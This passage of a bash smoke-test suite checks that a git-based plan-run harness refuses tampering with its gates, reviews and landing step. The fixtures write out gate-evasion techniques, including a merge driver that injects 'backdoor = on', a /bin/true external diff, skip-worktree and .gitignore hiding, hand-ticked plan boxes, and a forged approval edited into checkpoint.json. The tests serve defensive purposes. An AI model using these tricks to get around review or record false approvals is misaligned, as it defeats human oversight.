( cd "$L7" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=apex.smoke GIT_CONFIG_VALUE_0=1 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "init with env-supplied git config failed"
has "GATE_STEP: test PASS" "$(cd "$L7" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=apex.smoke GIT_CONFIG_VALUE_0=1 "$EX/green-gate.sh" plans/k-plan.md check 2>&1)" \
  || fail "a gate command lost its env-supplied git config"
ok "classifier inputs: color config, large diffs; no-worktree feature branch, remote base, restart guard, env git config"

# 40. A trusted external diff cannot decide an exemption or the land boundary
#     (git 2.46+); control characters in paths cannot fuse into an allowlisted
#     word; many matching lines do not crash the classifier; a finished run
#     without a worktree does not block the next one.
M1="$SMOKE_TMP/m1"; mkdir -p "$M1/plans"; git init -q -b main "$M1"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Gate 1→2** [gate:human] sign-off\n  - Acceptance: true\n' >"$M1/plans/m-plan.md"; git -C "$M1" add -A; git -C "$M1" commit -qm m
( cd "$M1" && APEX_GIBSON=0 "$EX/init.sh" plans/m-plan.md >/dev/null 2>&1 ) || fail "init for check 40 failed"
MW="$(st "$M1" plans/m-plan.md)/worktree"; echo doc >"$MW/notes.md"; git -C "$MW" add -A; git -C "$MW" commit -qm d
(cd "$M1" && "$EX/green-gate.sh" plans/m-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/m-plan.md 1 >/dev/null \
  && "$CP" plans/m-plan.md review 1 "$(git -C "$MW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/m-plan.md complete 1 ok >/dev/null 2>&1) || fail "check 40 task 1 could not complete"
mkdir -p "$MW/src/auth"; echo x >"$MW/src/auth/login.py"; git -C "$MW" add -A; git -C "$MW" commit -qm auth
git -C "$M1" config diff.external /bin/true; git -C "$M1" config diff.trustExitCode true
expect_refusal "a gate line with code under a trusted external diff" "no risk tier\|no independent review\|green" indir "$M1" "$CP" plans/m-plan.md complete 3 ok
git -C "$M1" config --unset diff.external; git -C "$M1" config --unset diff.trustExitCode
C1="$(mktemp -d "$SMOKE_TMP/c.XXXXXX")"; CW="$(mkrun "$C1")" || fail "init for check 40 failed"
printf 'def can_access(u): return True\n' >"$CW/$(printf '\a')ssociate.py"; git -C "$CW" add -A; git -C "$CW" commit -qm c
has "^TIER: C" "$(cd "$C1" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "a control character fused a path word into an allowlisted one"
C2="$(mktemp -d "$SMOKE_TMP/c.XXXXXX")"; CW="$(mkrun "$C2")" || fail "init for check 40 failed"
seq 1 50000 | sed 's/^/price = /' >"$CW/prices.txt"; git -C "$CW" add -A; git -C "$CW" commit -qm p
out="$(cd "$C2" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record 2>&1)" || fail "risk-tier failed on a diff with many matching lines"
has "^TIER: C" "$out" || fail "a diff with many matching lines was not Tier C"
F1="$SMOKE_TMP/f1"; mkdir -p "$F1/plans"; git init -q -b main "$F1"; printf '.dev-plan-state/\n' >"$F1/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F1/plans/a-plan.md"; git -C "$F1" add -A; git -C "$F1" commit -qm a
( cd "$F1" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for check 40 failed"
echo doc >"$F1/notes.md"; git -C "$F1" add notes.md; git -C "$F1" commit -qm d
(cd "$F1" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null \
  && "$CP" plans/a-plan.md review 1 "$(git -C "$F1" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "the finished-run fixture could not complete"
git -C "$F1" add -A; git -C "$F1" commit -qm tick
printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F1/plans/b-plan.md"; echo more >>"$F1/notes.md"; git -C "$F1" add -A; git -C "$F1" commit -qm b
( cd "$F1" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "a finished no-worktree run blocked the next run"
# "Finished" is derived when the guard runs: a reopened plan, or a last task
# completed with the harness off, keeps the guard on; so does a restart in
# worktree mode.
F4="$SMOKE_TMP/f4"; mkdir -p "$F4/plans"; git init -q -b main "$F4"; printf '.dev-plan-state/\n' >"$F4/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F4/plans/a-plan.md"; git -C "$F4" add -A; git -C "$F4" commit -qm a
( cd "$F4" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the reopen test failed"
echo doc >"$F4/notes.md"; git -C "$F4" add notes.md; git -C "$F4" commit -qm d
(cd "$F4" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null \
  && "$CP" plans/a-plan.md review 1 "$(git -C "$F4" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "the reopen fixture could not finish"
printf -- '- [ ] **Phase 1.2** [backend] c\n  - Acceptance: true\n' >>"$F4/plans/a-plan.md"
mkdir -p "$F4/src/auth"; echo 'import stripe' >"$F4/src/auth/login.py"; git -C "$F4" add -A; git -C "$F4" commit -qm reopen
printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F4/plans/b-plan.md"; git -C "$F4" add -A; git -C "$F4" commit -qm b
expect_refusal "a new run after a finished plan was reopened" "below the new run's fork point" indir "$F4" APEX_NO_WORKTREE=1 "$EX/init.sh" plans/b-plan.md
F2="$SMOKE_TMP/f2"; mkdir -p "$F2/plans"; git init -q -b main "$F2"; printf '.dev-plan-state/\n' >"$F2/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F2/plans/a-plan.md"; git -C "$F2" add -A; git -C "$F2" commit -qm a
( cd "$F2" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the harness-off test failed"
mkdir -p "$F2/src/auth"; echo 'import stripe' >"$F2/src/auth/login.py"; git -C "$F2" add -A; git -C "$F2" commit -qm x
(cd "$F2" && APEX_GIBSON=0 "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "APEX_GIBSON=0 complete failed"
printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F2/plans/b-plan.md"; git -C "$F2" add -A; git -C "$F2" commit -qm b
expect_refusal "a new run after a last task completed with the harness off" "below the new run's fork point" indir "$F2" APEX_NO_WORKTREE=1 "$EX/init.sh" plans/b-plan.md
F3="$SMOKE_TMP/f3"; mkdir -p "$F3/plans"; git init -q -b main "$F3"; printf '.dev-plan-state/\n' >"$F3/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F3/plans/a-plan.md"; git -C "$F3" add -A; git -C "$F3" commit -qm a
( cd "$F3" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the mode-switch test failed"
mkdir -p "$F3/src/auth"; echo 'import stripe' >"$F3/src/auth/login.py"; git -C "$F3" add -A; git -C "$F3" commit -qm x
expect_refusal "a restart in worktree mode over unreviewed commits" "below the new run's fork point" indir "$F3" APEX_INIT_FORCE=1 "$EX/init.sh" plans/a-plan.md
# Only a reviewed completion retires a run: a box ticked by hand does not.
F5="$SMOKE_TMP/f5"; mkdir -p "$F5/plans"; git init -q -b main "$F5"; printf '.dev-plan-state/\n' >"$F5/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [backend] b\n  - Acceptance: true\n' >"$F5/plans/a-plan.md"; git -C "$F5" add -A; git -C "$F5" commit -qm a
( cd "$F5" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the hand-tick test failed"
echo doc >"$F5/notes.md"; git -C "$F5" add notes.md; git -C "$F5" commit -qm d
(cd "$F5" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null \
  && "$CP" plans/a-plan.md review 1 "$(git -C "$F5" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "the hand-tick fixture task 1 could not complete"
git -C "$F5" add -A; git -C "$F5" commit -qm tick; (cd "$F5" && "$EX/iterate.sh" plans/a-plan.md >/dev/null 2>&1) || true
mkdir -p "$F5/src/auth"; echo 'import stripe' >"$F5/src/auth/login.py"; git -C "$F5" add src; git -C "$F5" commit -qm x
sed -i.bak 's/^- \[ \] \*\*Phase 1.2/- [x] **Phase 1.2/' "$F5/plans/a-plan.md" && rm -f "$F5/plans/a-plan.md.bak"
expect_refusal "a restart after a box ticked by hand" "below the new run's fork point" indir "$F5" APEX_NO_WORKTREE=1 APEX_INIT_FORCE=1 "$EX/init.sh" plans/a-plan.md
# A properly finished run whose plan was archived does not block the next run.
F6="$SMOKE_TMP/f6"; mkdir -p "$F6/plans"; git init -q -b main "$F6"; printf '.dev-plan-state/\n' >"$F6/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F6/plans/a-plan.md"; git -C "$F6" add -A; git -C "$F6" commit -qm a
( cd "$F6" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the archive test failed"
echo doc >"$F6/notes.md"; git -C "$F6" add notes.md; git -C "$F6" commit -qm d
(cd "$F6" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null \
  && "$CP" plans/a-plan.md review 1 "$(git -C "$F6" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "the archive fixture could not finish"
git -C "$F6" add -A; git -C "$F6" commit -qm tick; mkdir -p "$F6/plans/done"; git -C "$F6" mv plans/a-plan.md plans/done/a-plan.md; echo more >>"$F6/notes.md"; git -C "$F6" add -A; git -C "$F6" commit -qm archive
printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F6/plans/b-plan.md"; git -C "$F6" add -A; git -C "$F6" commit -qm b
( cd "$F6" && "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "a finished run with an archived plan blocked the next run"
# A run without a worktree completes only on its own branch; a live run's
# worktree branch is never another run's base.
F7="$SMOKE_TMP/f7"; mkdir -p "$F7/plans"; git init -q -b main "$F7"; printf '.dev-plan-state/\n' >"$F7/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F7/plans/a-plan.md"; git -C "$F7" add -A; git -C "$F7" commit -qm a
( cd "$F7" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the branch test failed"
mkdir -p "$F7/src/auth"; echo 'import stripe' >"$F7/src/auth/login.py"; git -C "$F7" add src; git -C "$F7" commit -qm x
git -C "$F7" checkout -qb side HEAD~1; echo doc >"$F7/notes.md"; git -C "$F7" add notes.md; git -C "$F7" commit -qm d
(cd "$F7" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null; "$CP" plans/a-plan.md review 1 "$(git -C "$F7" rev-parse HEAD)" APPROVE >/dev/null) || true
expect_refusal "a no-worktree completion on another branch" "complete it on its own branch" indir "$F7" "$CP" plans/a-plan.md complete 1 ok
F8="$SMOKE_TMP/f8"; mkdir -p "$F8/plans"; git init -q -b main "$F8"; printf '.dev-plan-state/\n' >"$F8/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F8/plans/a-plan.md"; printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F8/plans/b-plan.md"
git -C "$F8" add -A; git -C "$F8" commit -qm ab
( cd "$F8" && "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "init for the base-branch test failed"
F8B="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_branch"])' "$(st "$F8" plans/a-plan.md)/checkpoint.json")"
expect_refusal "a base branch that is another live run's worktree branch" "worktree branch of another run" indir "$F8" APEX_BASE_BRANCH="$F8B" "$EX/init.sh" plans/b-plan.md
ok "trusted external diff, control-character paths, many matches, finished/reopened/harness-off/hand-ticked no-worktree runs, archived plans, mode switch, run branch, live-run base"

# 41. Per-run integrity at the exits: land builds the landed tree from the
#     reviewed head plus the base's own changes, never with merge machinery —
#     an -s ours merge cannot revert base changes, a path changed on both
#     sides to different entries is refused until the run reforks onto the
#     current base and re-reviews, merge drivers never run; the gate refuses a
#     working tree that is not its head.
oursrun() { # oursrun DIR MODE — MODE: ours | normal | ours-touch | refork | driver; prints land's output
  local d="$1" how="$2" w; mkdir -p "$d/plans"; git init -q -b main "$d"
  printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n' >"$d/plans/o-plan.md"
  printf 'max_items = 5\n1\n2\n3\nnote = a\n' >"$d/limits.txt"; git -C "$d" add -A; git -C "$d" commit -qm o
  ( cd "$d" && "$EX/init.sh" plans/o-plan.md >/dev/null 2>&1 ) || { echo "init-failed"; return 0; }
  w="$(st "$d" plans/o-plan.md)/worktree"
  done_task() { # done_task LINE
    (cd "$d" && "$EX/green-gate.sh" plans/o-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/o-plan.md "$1" >/dev/null \
      && "$CP" plans/o-plan.md review "$1" "$(git -C "$w" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/o-plan.md complete "$1" ok >/dev/null 2>&1)
  }
  if [ "$how" = ours-touch ] || [ "$how" = refork ]; then printf 'max_items = 5\n1\n2\n3\nnote = b\n' >"$w/limits.txt"; else echo a >"$w/a.md"; fi
  git -C "$w" add -A; git -C "$w" commit -qm a; done_task 1 || { echo "task1-failed"; return 0; }
  git -C "$d" add plans/o-plan.md; git -C "$d" commit -qm tick1
  printf 'max_items = 9\n1\n2\n3\nnote = a\n' >"$d/limits.txt"; git -C "$d" commit -qam fix
  if [ "$how" = driver ]; then
    git -C "$d" config merge.evil.driver "printf 'backdoor = on\n' > %A"; echo '* merge=evil' >>"$d/.git/info/attributes"
  fi
  case "$how" in
    ours|ours-touch) git -C "$w" merge -q -s ours -m sync main ;;
    normal|refork) git -C "$w" merge -q -m sync main ;;
  esac
  [ "$how" = refork ] && { (cd "$d" && "$CP" plans/o-plan.md refork "base moved under limits.txt" >/dev/null 2>&1) || { echo "refork-failed"; return 0; }; }
  echo b >"$w/b.md"; git -C "$w" add -A; git -C "$w" commit -qm b; done_task 3 || { echo "task2-failed"; return 0; }
  git -C "$d" add plans/o-plan.md; git -C "$d" commit -qm tick2
  local rc=0; (cd "$d" && "$EX/land.sh" plans/o-plan.md 2>&1 | grep -v '^\[land\]' ; exit "${PIPESTATUS[0]}") || rc=$?; echo "land-rc=$rc"
}
O1="$(oursrun "$SMOKE_TMP/o1" ours)"
has "merged main since its fork point" "$O1" && ! has "land-rc=0" "$O1" && grep -q 'max_items = 9' "$SMOKE_TMP/o1/limits.txt" \
  || fail "a run branch that merged the base (-s ours) landed without a refork: $(printf '%s' "$O1" | tail -2)"
O2="$(oursrun "$SMOKE_TMP/o2" normal)"
has "merged main since its fork point" "$O2" && ! has "land-rc=0" "$O2" || fail "a run branch that merged the base landed without a refork: $(printf '%s' "$O2" | tail -2)"
O3="$(oursrun "$SMOKE_TMP/o3" ours-touch)"
! has "land-rc=0" "$O3" || fail "an -s ours merge plus an edit to the same file landed: $(printf '%s' "$O3" | tail -2)"
O4="$(oursrun "$SMOKE_TMP/o4" refork)"
has "land-rc=0" "$O4" && grep -q 'max_items = 9' "$SMOKE_TMP/o4/limits.txt" && grep -q 'note = b' "$SMOKE_TMP/o4/limits.txt" \
  || fail "a reforked, re-reviewed run did not land both sides: $(printf '%s' "$O4" | tail -2)"
O5="$(oursrun "$SMOKE_TMP/o5" driver)"
has "land-rc=0" "$O5" && ! grep -rq backdoor "$SMOKE_TMP/o5" --include='*.txt' --include='*.md' || fail "a merge driver touched the landed tree: $(printf '%s' "$O5" | tail -2)"
# A refork starts a new review epoch: the approval of the narrower diff no longer counts.
O6="$SMOKE_TMP/o6"; oursrun "$O6" ours >/dev/null
git -C "$(st "$O6" plans/o-plan.md)/worktree" merge -q -s ours -m resync main
(cd "$O6" && "$CP" plans/o-plan.md refork "base moved" >/dev/null 2>&1) || fail "refork after an -s ours merge failed"
expect_refusal "a completion after refork that reuses the pre-refork review" "no risk tier\|no independent review" indir "$O6" "$CP" plans/o-plan.md complete 3 ok
# ...and neither does a G12 approval given before the refork.
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); h=sys.argv[2]
s.setdefault("approvals",{})["3"]={"gate":"G12","sha":h,"epoch":s.get("epoch",0)-1,"phrase":"pre-refork","at":"x"}
s.setdefault("tiers",{})["3"]={"tier":"C","since":"","head":h,"epoch":s.get("epoch",0)}; json.dump(s,open(p,"w"))' \
  "$(st "$O6" plans/o-plan.md)/checkpoint.json" "$(git -C "$(st "$O6" plans/o-plan.md)/worktree" rev-parse HEAD)"
expect_refusal "a Tier C completion after refork that reuses the pre-refork G12" "G12) for this exact head SHA in this epoch" indir "$O6" "$CP" plans/o-plan.md complete 3 ok
# A base submodule bump survives land even when .gitmodules says ignore = all.
U1="$SMOKE_TMP/u1"; mkdir -p "$U1/plans" "$U1/s"; git init -q -b main "$U1"
UA="$(git -C "$U1" commit-tree "$(git -C "$U1" mktree </dev/null)" -m a)"; UB="$(git -C "$U1" commit-tree "$(git -C "$U1" mktree </dev/null)" -p "$UA" -m b)"
printf '[submodule "s"]\n\tpath = s\n\turl = ./s.git\n\tignore = all\n' >"$U1/.gitmodules"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$U1/plans/u-plan.md"; git -C "$U1" add .gitmodules plans
git -C "$U1" update-index --add --cacheinfo "160000,$UA,s"; git -C "$U1" commit -qm u
( cd "$U1" && "$EX/init.sh" plans/u-plan.md >/dev/null 2>&1 ) || fail "init for the submodule test failed"
UW="$(st "$U1" plans/u-plan.md)/worktree"; echo a >"$UW/a.md"; git -C "$UW" add a.md; git -C "$UW" commit -qm a
(cd "$U1" && "$EX/green-gate.sh" plans/u-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/u-plan.md 1 >/dev/null \
  && "$CP" plans/u-plan.md review 1 "$(git -C "$UW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/u-plan.md complete 1 ok >/dev/null 2>&1) || fail "the submodule fixture task could not complete"
git -C "$U1" add plans/u-plan.md; git -C "$U1" commit -qm tick; git -C "$U1" update-index --cacheinfo "160000,$UB,s"; git -C "$U1" commit -qm bump
(cd "$U1" && "$EX/land.sh" plans/u-plan.md >/dev/null 2>&1) && [ "$(git -C "$U1" rev-parse HEAD:s)" = "$UB" ] \
  || fail "land reverted a base submodule bump hidden by submodule ignore = all"
# land re-run after the teardown failed (a locked worktree) finishes instead of refusing.
L1="$SMOKE_TMP/l1"; mkdir -p "$L1/plans"; git init -q -b main "$L1"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L1/plans/l-plan.md"; git -C "$L1" add -A; git -C "$L1" commit -qm l
( cd "$L1" && "$EX/init.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "init for the land re-run test failed"
LW="$(st "$L1" plans/l-plan.md)/worktree"; echo a >"$LW/a.md"; git -C "$LW" add a.md; git -C "$LW" commit -qm a
(cd "$L1" && "$EX/green-gate.sh" plans/l-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/l-plan.md 1 >/dev/null \
  && "$CP" plans/l-plan.md review 1 "$(git -C "$LW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/l-plan.md complete 1 ok >/dev/null 2>&1) || fail "the land re-run fixture task could not complete"
git -C "$L1" add plans/l-plan.md; git -C "$L1" commit -qm tick; git -C "$L1" worktree lock "$LW"
expect_refusal "a land whose worktree is locked" "could not remove the worktree" indir "$L1" "$EX/land.sh" plans/l-plan.md
git -C "$L1" worktree unlock "$LW"
(cd "$L1" && "$EX/land.sh" plans/l-plan.md >/dev/null 2>&1) && [ ! -d "$LW" ] && [ -f "$L1/a.md" ] \
  && [ "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1])).get("landed"))' "$(st "$L1" plans/l-plan.md)/checkpoint.json")" = True ] \
  || fail "re-running land after an unlocked worktree did not finish the teardown"
# Disjoint changes land whatever their number or names; a path with a newline changed on both sides is refused.
D1="$SMOKE_TMP/d1"; mkdir -p "$D1/plans"; git init -q -b main "$D1"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$D1/plans/d-plan.md"; printf 'x\n' >"$D1/$(printf 'a\nb.txt')"; git -C "$D1" add -A; git -C "$D1" commit -qm d
( cd "$D1" && "$EX/init.sh" plans/d-plan.md >/dev/null 2>&1 ) || fail "init for the disjoint test failed"
DW="$(st "$D1" plans/d-plan.md)/worktree"; echo r >"$DW/$(printf 'a\nb.txt')"; git -C "$DW" commit -qam r
(cd "$D1" && "$EX/green-gate.sh" plans/d-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/d-plan.md 1 >/dev/null \
  && "$CP" plans/d-plan.md review 1 "$(git -C "$DW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/d-plan.md complete 1 ok >/dev/null 2>&1) || fail "the disjoint fixture task could not complete"
git -C "$D1" add plans/d-plan.md; git -C "$D1" commit -qm tick
echo b >"$D1/$(printf 'a\nb.txt')"; git -C "$D1" commit -qam base-edit
expect_refusal "a newline path changed on both sides" "changed on both sides" indir "$D1" "$EX/land.sh" plans/d-plan.md
git -C "$D1" reset -q --hard HEAD~1; mkdir -p "$D1/vendor"; for i in $(seq 1 3000); do echo "$i" >"$D1/vendor/f$i.txt"; done
git -C "$D1" add vendor; git -C "$D1" commit -qm vendor
(cd "$D1" && "$EX/land.sh" plans/d-plan.md >/dev/null 2>&1) && [ -f "$D1/vendor/f3000.txt" ] && [ "$(cat "$D1/$(printf 'a\nb.txt')")" = r ] \
  || fail "a run did not land beside 3000 disjoint base changes"
G1="$SMOKE_TMP/g1"; mkdir -p "$G1/plans"; git init -q -b main "$G1"
printf 'test:\n\t@grep -q GOOD impl.txt\n' >"$G1/Makefile"; echo GOOD >"$G1/impl.txt"; printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$G1/plans/g-plan.md"
git -C "$G1" add -A; git -C "$G1" commit -qm g
( cd "$G1" && "$EX/init.sh" plans/g-plan.md >/dev/null 2>&1 ) || fail "init for the gate test failed"
GW="$(st "$G1" plans/g-plan.md)/worktree"; echo BAD >"$GW/impl.txt"; git -C "$GW" commit -qam bad
echo GOOD >"$GW/impl.txt"; git -C "$GW" update-index --skip-worktree impl.txt
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate passed a head whose failing file was hidden by skip-worktree"
git -C "$GW" update-index --no-skip-worktree impl.txt; git -C "$GW" checkout -q impl.txt; git -C "$GW" config status.showUntrackedFiles no; echo x >"$GW/extra.txt"
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate ignored an untracked file hidden by status.showUntrackedFiles=no"
git -C "$GW" config --unset status.showUntrackedFiles
mkdir -p "$(git -C "$GW" rev-parse --git-common-dir)/info"; echo extra.txt >>"$(git -C "$GW" rev-parse --git-common-dir)/info/exclude"
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate ignored an untracked file hidden by .git/info/exclude"
: >"$(git -C "$GW" rev-parse --git-common-dir)/info/exclude"; printf '*\n' >"$GW/.gitignore"
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate ignored untracked files hidden by an untracked .gitignore"
rm -f "$GW/.gitignore"
printf '.*\n!/.gitignore\n.cache/\n' >"$GW/.gitignore"; git -C "$GW" add .gitignore; git -C "$GW" commit -qm ignore-cache; mkdir -p "$GW/.cache"; printf '*\n' >"$GW/.cache/.gitignore"
! has ".cache" "$(source "$EX/_lib.sh"; apex_dirty "$GW")" || fail "the gate counted a tool cache's .gitignore that a committed .gitignore ignores"
mkdir -p "$GW/lib"; printf 'evil.py\n' >"$GW/lib/.gitignore"; echo x >"$GW/lib/evil.py"
has "lib/evil.py" "$(source "$EX/_lib.sh"; apex_dirty "$GW")" || fail "the gate missed an untracked .gitignore whose name (not directory) a committed '.*' rule ignores"
rm -rf "$GW/lib"
printf 'build\n' >>"$GW/.gitignore"; git -C "$GW" commit -qam ignore-build; mkdir -p "$GW/:build"; printf '*\n' >"$GW/:build/.gitignore"; echo x >"$GW/:build/t.py"
has ":build/.gitignore" "$(source "$EX/_lib.sh"; apex_dirty "$GW")" || fail "the gate trusted an untracked .gitignore in a directory whose name is pathspec magic (:build)"
rm -rf "$GW/:build"
# Submodules: files in one that is not checked out, and files hidden by a
# populated one's untracked .gitignore, are differences from the head.
SM="$SMOKE_TMP/sm"; mkdir -p "$SM"; git init -q -b main "$SM"; echo r >"$SM/r.txt"
git init -q -b main "$SM/sub"; echo s >"$SM/sub/s.txt"; git -C "$SM/sub" add -A; git -C "$SM/sub" commit -qm s
git -C "$SM" add r.txt 2>/dev/null; git -C "$SM" update-index --add --cacheinfo "160000,$(git -C "$SM/sub" rev-parse HEAD),sub"
git -C "$SM" update-index --add --cacheinfo "160000,$(git -C "$SM/sub" rev-parse HEAD),empty"; git -C "$SM" commit -qm sm >/dev/null 2>&1
mkdir -p "$SM/empty"   # what a checkout leaves for a submodule it does not check out
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SM")" ] || fail "a clean repository with submodules was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SM")"
printf '*\n' >"$SM/sub/.gitignore"; echo x >"$SM/sub/conftest.py"
has "submodule sub: not in the head: .*conftest.py" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed files hidden by an untracked .gitignore in a populated submodule"
rm -f "$SM/sub/.gitignore" "$SM/sub/conftest.py"; echo x >"$SM/empty/conftest.py"
has "submodule directory that is not checked out: empty" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed files in a submodule directory that is not checked out"
rm -f "$SM/empty/conftest.py"
# A submodule path that is not plain text to a program (a|b) is still checked.
git -C "$SM" update-index --add --cacheinfo "160000,$(git -C "$SM/sub" rev-parse HEAD),a|b"; git -C "$SM" commit -qm ab >/dev/null 2>&1
git clone -q "$SM/sub" "$SM/a|b" 2>/dev/null; printf '*\n' >"$SM/a|b/.gitignore"; echo x >"$SM/a|b/conftest.py"
has "submodule a|b: not in the head: .*conftest.py" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed a hidden file in a submodule whose path contains |"
rm -f "$SM/a|b/.gitignore" "$SM/a|b/conftest.py"
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SM")" ] || fail "clean submodules (including a|b) were reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SM")"
# A directory this user cannot list hides its files from git, not from the tests.
asuser() { if [ "$(id -u)" != 0 ]; then "$@"; elif command -v setpriv >/dev/null; then setpriv --bounding-set=-dac_override,-dac_read_search "$@"; else echo "no-setpriv"; fi; }
mkdir -p "$SM/zz"; echo x >"$SM/zz/conftest.py"; chmod 311 "$SM/zz"
ZZ="$(asuser bash -c 'source "$1/_lib.sh"; apex_dirty "$2"' _ "$EX" "$SM")"
has "no-setpriv" "$ZZ" || has "cannot be listed" "$ZZ" || fail "the gate missed an untracked directory this user cannot list: $ZZ"
chmod 755 "$SM/zz"; rm -rf "$SM/zz"; echo x >"$SM/empty/conftest.py"; chmod 311 "$SM/empty"
ZZ="$(asuser bash -c 'source "$1/_lib.sh"; apex_dirty "$2"' _ "$EX" "$SM")"
has "no-setpriv" "$ZZ" || has "cannot be listed" "$ZZ" || fail "the gate missed a submodule directory this user cannot list: $ZZ"
chmod 755 "$SM/empty"; rm -f "$SM/empty/conftest.py"
has "no-setpriv" "$ZZ" && echo "smoke note: running as root without setpriv — the unlistable-directory checks were skipped"
# A '.git' entry below the top hides its directory's files from git, and git
# commands run there answer from it.
mkdir -p "$SM/lib"; echo l >"$SM/lib/l.txt"; git -C "$SM" add lib; git -C "$SM" commit -qm lib >/dev/null 2>&1
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SM")" ] || fail "a clean repository with a tracked directory was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SM")"
git init -q "$SM/lib"
has "lib/.git (a .git entry)" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed a repository planted in a tracked directory"
rm -rf "$SM/lib/.git"; mkdir -p "$SM/lib/.git"; echo x >"$SM/lib/.git/conftest.py"
